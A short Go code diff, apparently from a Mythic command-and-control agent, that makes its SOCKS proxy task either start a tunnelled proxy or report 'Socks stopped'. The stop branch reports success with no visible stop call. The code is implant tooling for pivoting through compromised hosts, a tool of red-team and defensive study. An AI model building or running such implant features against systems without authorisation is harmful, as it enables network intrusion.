@@ -546,12 +546,17 @@ func main() {
 						mu.Unlock()
 						break
 					}
-
-					go socks.Run(task.Tasks[j], fromMythicSocksChannel, toMythicSocksChannel)
 					resp := structs.Response{}
-					resp.UserOutput = "Socks started"
-					resp.Completed = true
-					resp.TaskID = task.Tasks[j].TaskID
+                    if args.Action == "start" {
+					    go socks.Run(task.Tasks[j], fromMythicSocksChannel, toMythicSocksChannel)
+                        resp.UserOutput = "Socks started"
+                        resp.Completed = true
+                        resp.TaskID = task.Tasks[j].TaskID
+                    }else{
+                        resp.UserOutput = "Socks stopped"
+                        resp.Completed = true
+                        resp.TaskID = task.Tasks[j].TaskID
+                    }
 					encResp, err := json.Marshal(resp)
 					if err != nil {
 						errResp := structs.Response{}
